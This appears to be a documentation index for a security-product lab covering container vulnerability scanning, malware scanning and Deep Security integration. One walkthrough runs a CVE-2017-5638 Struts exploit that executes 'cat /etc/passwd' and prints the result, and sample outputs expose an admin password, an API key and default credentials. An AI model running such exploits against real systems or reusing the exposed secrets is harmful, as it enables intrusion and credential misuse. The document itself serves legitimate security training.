<li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/#the-story","title":"The story","text":"<p>There is no real story here :-)</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-violations/#goals","title":"Goals","text":"<p>Review the detections in Vision One. Check Observed Attack Techniques and Workbenches.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/","title":"Scenario: Runtime Vulnerability Scanning","text":""},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime. The deployments of the scenarios configuration are all based on container images with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-ec2/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2017-5638  Identify the vulnerable deployment/container  Find out the namespace and metadata.  You'll see that the deployment is running within the `victims` namespace and owns the label `app=java-goof`.  Checking the services in the namespace `victims`   <pre><code>kubectl -n victims get services\n</code></pre>  tells us  <pre><code>NAME                TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE\njava-goof-service   NodePort   172.20.132.99    &lt;none&gt;        8080:30119/TCP   26m\nweb-app-service     NodePort   172.20.121.120   &lt;none&gt;        80:32194/TCP     26m\n</code></pre>  That `java-goof` is reachable on port 8080.  Let's try to verify the vulnerability using the `attacker-cve-2017-5638` pod running in the namespace `attackers`. In your shell run  <pre><code>namespace=\"victims\"\n\nkubectl exec -n attackers \\\n  $(kubectl -n attackers get pods --selector=app=attacker-cve-2017-5638 -o jsonpath='{.items[0].metadata.name}') -- \\\n  python3 exploit.py http://java-goof-service.${namespace}:8080 'cat /etc/passwd'\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre>  You proofed that the application server of your little todolist application is vulnerable to CVE-2017-5638.  You may recognize the url `http://java-goof-service.${namespace}:8080` used in the `kubectl` command. Since we're attacking from a pod running on the cluster we can reference the java-goof-service by it's DNS name managed by CoreDNS. The schema for this is `service.namespace`.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/","title":"Scenario: Runtime Vulnerability Scanning on Fargate","text":""},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Fargate Cluster </li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: Nginx</li> </ul> </li> </ul> <p>Ensure to have the EKS Fargate Cluster up and running:</p> <pre><code>pgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime for EKS with Fargate profiles.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> </ul>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#the-story","title":"The story","text":"<p>Here we're checking for the CVE-2021-3711 in OpenSSL with a criticality of 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).</p> <p>You want to search this specific vulnerability in your production environment.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/cloud-security/container-security/eks/runtime-vulnerability-fargate/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2021-3711  Identify the vulnerable deployment/container.  Find out the node(s) running the pod(s).  <pre><code>kubectl get pods -A -o wide\n</code></pre>  You'll see that the deployment is running within the `default` namespace. The name(s) of the worker nodes start with `fargate-ip-...` which indicate that these nodes are AWS managed Fargate nodes.  Checking the services  <pre><code>kubectl get services\n</code></pre>  tells us  <pre><code>NAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nnginx-service   NodePort   172.20.48.60   &lt;none&gt;        80:32443/TCP   26m\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-artifact-scanning/","title":"Scenario: File Malware Scanning","text":""},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-artifact-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Cloud Security File Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>File Security<ul> <li>Run file scan via SDK</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Ensure to have the latest <code>tmfs</code> deployed:</p> <pre><code>tmcli-update\n</code></pre>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-artifact-scanning/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMFS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmfs defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>To easily scan an image for vulnerabililies run</p> <pre><code># Service region us-east-1, scan directory\ntmfs scan dir:path/to/yourproject\n\n# Service region us-east-1, scan single file\ntmfs scan file:path/to/yourproject/file\n\n# Service region eu-central-1, scan single file\ntmfs scan file:path/to/yourproject/file --region eu-central-1\n</code></pre> <p>Example output for <code>tmfs scan file:./eicar.zip | jq .</code>:</p> <pre><code>{\n  \"scannerVersion\": \"1.0.0-631\",\n  \"schemaVersion\": \"1.0.0\",\n  \"scanResult\": 1,\n  \"scanId\": \"72c04b72-0e5b-45b4-a460-6c4346beec5e\",\n  \"scanTimestamp\": \"2023-12-20T11:44:30.526Z\",\n  \"fileName\": \"./eicar.zip\",\n  \"foundMalwares\": [\n    {\n      \"fileName\": \"./eicar.zip\",\n      \"malwareName\": \"OSX_EICAR.PFH\"\n    }\n  ],\n  \"fileSHA1\": \"d27265074c9eac2e2122ed69294dbc4d7cce9141\",\n  \"fileSHA256\": \"2546dcffc5ad854d4ddc64fbf056871cd5a00f2471cb7a5bfd4ac23b6e9eedad\"\n}\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/","title":"Scenario: S3 Bucket Malware Scanning","text":""},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Cloud Security File Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>File Security<ul> <li>Run file scan via SDK</li> </ul> </li> </ul> </li> </ul> </li> <li>Know your Vision One region.</li> </ul> <p>PGO S3 Scanning</p> <p>This scenario uses Playground Ones own S3 Bucket Scanner which is not the official solution component of Vision One. It uses the File Security Python SDK within a Lambda Function. Scan results will show up on the Vision One console.</p>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#limitations","title":"Limitations","text":"<ul> <li>Maximum file size 1GB</li> <li>The scanned files are neither tagged nor quarantined, just scanned.</li> </ul>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#architecture","title":"Architecture","text":"<p>The scanner consists out of the following components:</p> <ul> <li>A Lambda function triggered by <code>s3:ObjectCreated</code> events. It uses the File Security Python SDK via gRPC.</li> <li>The function uses a custom layer containing the required dependencies including the SDK.</li> <li>An S3 Bucket with the permission to notify the Lambda.</li> <li>An IAM Role and Policy.</li> </ul> <p>Note: Lambda will use Python 3.11</p>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#the-function-code","title":"The Function Code","text":"<p>Below are the relevant sections of the function code:</p> <pre><code>import json\nimport os\nimport time\nimport urllib.parse\n\nimport amaas.grpc\nimport boto3\n\nv1_region = os.getenv(\"V1_REGION\")\nv1_api_key = os.getenv(\"V1_API_KEY\")\n\ns3 = boto3.resource(\"s3\")\n\n\ndef lambda_handler(event, context):\n\n    print(f\"event -&gt; {str(event)}\")\n\n    handle = amaas.grpc.init_by_region(v1_region, v1_api_key, True)\n\n    for record in event[\"Records\"]:\n\n        bucket = record[\"s3\"][\"bucket\"][\"name\"]\n        key = urllib.parse.unquote_plus(record[\"s3\"][\"object\"][\"key\"], encoding=\"utf-8\")\n\n        pml = True\n        feedback = True\n        verbose = True\n        digest = True\n\n        try:\n            s3object = s3.Object(bucket, key)\n            # Load file into a buffer\n            buffer = s3object.get().get(\"Body\").read()\n\n            s = time.perf_counter()\n\n            # Scan the file\n            scan_resp = amaas.grpc.scan_buffer(\n                handle,\n                buffer,\n                key,\n                tags=[\"pgo\"],\n                pml=pml,\n                feedback=feedback,\n                verbose=verbose,\n                digest=digest,\n            )\n\n            scan_result = json.loads(scan_resp)\n            elapsed = time.perf_counter() - s\n            print(f\"scan executed in {elapsed:0.2f} seconds.\")\n            print(f\"scan result -&gt; {str(scan_result)}\")\n\n        except Exception as e:\n            print(e)\n            print(\"error scan object {} from bucket {}.\".format(key, bucket))\n\n    amaas.grpc.quit(handle)\n</code></pre>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#deployment","title":"Deployment","text":"<p>Assuming you have set your Vision One API Key and Vision One region with the help of the config tool simply run</p> <pre><code>pgo --apply s3scanner\n</code></pre> <p>The following outputs are created:</p> <pre><code>Outputs:\n\naws_lambda_function_name = \"pgo-id-bucket-scanner-2kn1vopd\"\naws_lambda_layer_arn = \"arn:aws:lambda:eu-central-1:634503960501:layer:pgo-id-filesecurity-layer-2kn1vopd:1\"\naws_s3_bucket_name = \"pgo-id-scanning-bucket-2kn1vopd\"\n</code></pre> <p>Feel free to review the Lambda function in the AWS console.</p>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#run-scans","title":"Run Scans","text":"<p>Either head over to the S3 bucket via the console to upload files or use the AWS cli.</p> <p>Download the <code>eicarcom2.zip</code> and upload it to the scanning bucket.</p> <p>Warning: Do not download malicious files on computers with a running anti malware engine!</p> <pre><code># Set your bucket name from the outputs\nSCANNING_BUCKET=pgo-id-scanning-bucket-2kn1vopd\n\nwget https://secure.eicar.org/eicarcom2.zip\naws s3 cp eicarcom2.zip s3://${SCANNING_BUCKET}/eicarcom2.zip\n</code></pre>"},{"location":"scenarios/cloud-security/file-security/artifact-scanning/tmfs-s3-bucket-scanning/#check-on-vision-one","title":"Check on Vision One","text":"<p>When heading over to your Vision One console to <code>Cloud Security Operations --&gt; File Security</code> you should see scan results with potentially detected malware.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/","title":"Scenario: Integrate Deep Security with Vision One and Service Gateway","text":""},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> <li>Activated Marketplace AMI for Trend Service Gateway BYOL</li> </ul> <p>The Playground One can provide a simulated on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>You need to have activated the Trend Service Gateway BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p></p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>AWS SG - create Service Gateway</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS SG - create Service Gateway [true]:\n...\n</code></pre> <p>Additionally, that you have <code>Enable Deep Security</code> enabled in your configuration and have set a valid Deep Security License.</p> <pre><code>...\nSection: Deep Security (on-prem)\nPlease set/update your Deep Security configuration\nEnable Deep Security? [true]: \nDeep Security License [AP-FHMD-FU...]: \nDeep Security Username [masteradmin]: \nDeep Security Password [trendmicro]: \n...\n</code></pre> <p>Now, deploy Deep Security and Deep Security Workload configurations by running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre> <p>The Service Gateway gets a dedicated AWS Security Group assigned which allows SSH from your configured access IP(s) only. All other ports are only accessible from within the public and private subnets.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security secures instances in an on-premise environment simulated for this scenario, to which you want to add the XDR capabilities provided by Vision One.</li> <li>You start by integrating Deep Security into the platform and connect it to a service gateway for Smart Protection Network and Active Update capabilities.</li> </ul>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#integration-workflow","title":"Integration Workflow","text":"<p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Micro Deep Security</code> --&gt; <code>Click to generate the enrollment token</code>.</li> </ol> <p></p> <ol> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>Click <code>[Connect and Transfer]</code>.</li> </ol> <p></p> <p>Deep Security</p> <ol> <li>Login to DSM Console as administrator.</li> <li>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></li> <li>Under <code>Registration</code>, click <code>Registration enrollment token</code>.</li> </ol> <p></p> <ol> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Deep Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p></p> <p>This tab shows the Endpoint Sensor deployment script as well.</p> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the DSM On Premise being conncted.</li> <li>Optionally install Endpoint Sensor to the instances.</li> </ol> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#integrate-with-the-service-gateway","title":"Integrate with the Service Gateway","text":""},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>In a real environment, you would now download the virtual machine and deploy it to the virtualization infrastructure. In this scenario, you do not need to download the virtual appliance as we will be using an AWS Marketplace AMI. Simply copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>sg_va_ssh</code>. Run the given command to connect to the Service Gateway.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\n</code></pre> <p></p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#add-services-to-the-service-gateway","title":"Add Services to the Service Gateway","text":"<p>Click on your newly created Service Gateway and press the button <code>[Manage Services]</code>.</p> <p>Download the Smart Protection Services and ActiveUpdate Service by pressing the blue circular buttons. Wait until download has finished.</p> <p></p> <p></p> <p>Back to the services click on the gear in the line of ActiveUpdate Service. Configure an Update Source by pressing <code>[+ Add]</code>.</p> <p>As the URL use <code>https://ipv6-iaus.trendmicro.com/iau_server.dll</code> and <code>Deep Security</code> as the Description.</p> <p>Then, using the newly configured Update source to generate the ActiveUpdate URL by pressing <code>[Generate]</code>.</p> <p></p> <p>Press <code>[Save]</code>.</p> <p>Now choose the Smart Protection Services gear.</p> <p></p> <p>The examples show the URLs for File and Web Reputation Services which we're now going to configure in Deep Security.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#configure-deep-security","title":"Configure Deep Security","text":"<p>In Deep Security navigate to <code>Administration -&gt; Updates</code> and paste the <code>iau_server.dll</code> URL from above into the field <code>Other update source</code>.</p> <p></p> <p>Lastly, head over to Policies and open the Base Policy. </p> <p>Open the <code>Anti-Malware -&gt; Smart Protection</code> tab</p> <p>Change the Smart Protection Server to use a locally installed Smart Protection Server. Add the URL from the previous chapter. </p> <p></p> <p>Analogous for <code>Web Reputation</code>.</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#install-endpoint-sensor-on-instances","title":"Install Endpoint Sensor on Instances","text":"<p>First, lets get the <code>ssh</code> commands to access our servers by running</p> <pre><code>pgo --output dsw\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\n...\nssh_instance_linux1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\"\nssh_instance_linux2 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.195.62.150\"\nssh_instance_windows1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\"\n...\n</code></pre> <p>To connect to a linux instance via the provided <code>ssh</code> command copy and paste the commnd in your shell</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\n</code></pre> <p>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></p> <p></p> <p>This tab shows the Endpoint Sensor deployment script for the supported platform types. First, select <code>Linux (64-bit)</code> and copy the script. In the shell on the connected server run <code>sudo su</code> to get <code>root</code> and simply paste the script.</p> <pre><code>Last login: Tue Jul  2 12:57:12 2024 from p57aa067b.dip0.t-ipconnect.de\n   ,     #_\n   ~\\_  ####_        Amazon Linux 2\n  ~~  \\_#####\\\n  ~~     \\###|       AL2 End of Life is 2025-06-30.\n  ~~       \\#/ ___\n   ~~       V~' '-&gt;\n    ~~~         /    A newer version of Amazon Linux is available!\n      ~~._.   _/\n         _/ _/       Amazon Linux 2023, GA and supported until 2028-03-15.\n       _/m/'           https://aws.amazon.com/linux/amazon-linux-2023/\n\n[ec2-user@ip-10-0-4-236 ~]$ sudo su\n[root@ip-10-0-4-236 ec2-user]# &lt;PASTE&gt;\n</code></pre> <p>Similar for Windows. Connect to the instance and paste the windows deployment script to the console.  Ignore the error at the top. The agent will install just fine.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\n</code></pre> <pre><code>Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\Users\\admin&gt; &lt;PASTE&gt;\n</code></pre> <p>When, as the final step, you head back to <code>Vision One -&gt; Endpoint Security -&gt; Endpoint Inventory</code> you will see the Deep Security instance integrated with Vision One and the available computers.</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-and-service-gateway/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have integrated your on-prem Deep Security instance to Vision One and enabled the XDR functionality. Your Deep Security is additionally integrated with the Service Gateway to streamline the network communication.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/","title":"Scenario: Integrate Deep Security with Vision One and Demo Benefits","text":"<p>This scenario is very similar to Integrate Deep Security with Vision One but here we're running some attacks before and after the integration. This should highlight the benefits of the integration, even without doing a full migration.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> </ul> <p>The Playground One can provide a simulated on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>Before starting the deployment of Deep Security, download the Atomic Launcher (latest Windows and Linux) from here and store them in the  <code>${ONEPATH}/awsone/9-deep-security/files</code> directory.</p> <p>Your <code>${ONEPATH}/awsone/9-deep-security/files</code>-directory should look like this:</p> <pre><code>total 95132\n-rw-rw-r-- 1 markus markus 17912014 Aug  1 12:43 atomic_launcher_linux_1.0.0.1009.zip\n-rw-rw-r-- 1 markus markus 79491173 Aug  1 12:43 atomic_launcher_windows_2.zip\n-rw-rw-r-- 1 markus markus        0 Nov 13  2023 see_documentation\n</code></pre> <p>The Atomic Launcher is stored within the downloads folder of each of the instances connected to Deep Security.</p> <p>Verify, that you have <code>Enable Deep Security</code> enabled in your configuration and have set a valid Deep Security License.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nSection: Deep Security (on-prem)\nPlease set/update your Deep Security configuration\nEnable Deep Security? [true]: \nDeep Security License [AP-FHMD-FU...]: \nDeep Security Username [masteradmin]: \nDeep Security Password [trendmicro]: \n...\n</code></pre> <p>Now, deploy Deep Security and Deep Security Workload configurations by running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security secures instances in an on-premise environment simulated for this scenario, to which you want to add the XDR capabilities provided by Vision One.</li> <li>You run some atomic tests before integrating Deep Security with Vision One.</li> <li>You then integrate Deep Security into the platform</li> <li>And rerun the same tests as before.</li> <li>Finally, you will compare the results.</li> </ul>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#test-round-1","title":"Test Round #1","text":"<p>Check the output of the <code>dsm</code>-configuration.</p> <pre><code>pgo --output dsm\n</code></pre> <pre><code>bastion_private_ip = \"10.0.4.13\"\nbastion_public_ip = \"3.120.148.35\"\nds_apikey = \"44EE16E8-7226-F0A1-948B-4851B6112D8A:1xyiBUaocwS1WxJwVhdb1ElPjaG5ps38HusJhJmiHOI=\"\ndsm_url = \"https://3.120.148.35:4119\"\nec2_profile = \"pgo-id-dsm-ec2-profile\"\nkey_name = \"pgo-id-dsm-key-pair\"\nprivate_key_path = \"/home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem\"\npublic_key = \"ssh-rsa 